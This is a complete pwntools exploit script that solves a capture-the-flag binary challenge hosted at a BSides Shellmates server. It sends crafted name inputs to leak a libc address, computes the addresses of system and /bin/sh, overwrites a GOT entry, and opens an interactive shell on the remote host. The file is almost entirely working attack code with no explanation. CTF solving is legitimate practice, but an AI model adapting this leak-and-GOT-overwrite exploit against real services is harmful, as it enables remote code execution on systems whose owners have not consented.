#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("chall_patched")
libc = elf.libc

local = False 
if local:
    p = process("./chall_patched")
    gdb.attach(p,'''''')
else:
    p=remote("junior-pwner.bsides.shellmates.club" ,443,ssl=True)

elf = context.binary = ELF('./chall_patched', checksec=False)


def name(data):
    p.sendafter(b"Your Name:", data)

puts_got_plt    = 0x404018
name(p64(puts_got_plt)*8 + p64(0x4041c0+0x30))

p.recvline()
libc_base = int.from_bytes(p.recvline(),"little") & 0x7fffffffffff - 528080
system = libc_base + 0x0000000000050d60
binsh = libc_base + 1935000
print("[+]Libc_base:    ", hex(libc_base))
print("[+]Binsh:    ", hex(binsh))
print("[+]System:    ", hex(system))

name(p64(binsh)*8 + p64(0x4041c0+0x50))
name(p64(system)*8 + p64(0x404018+0x50))

p.interactive()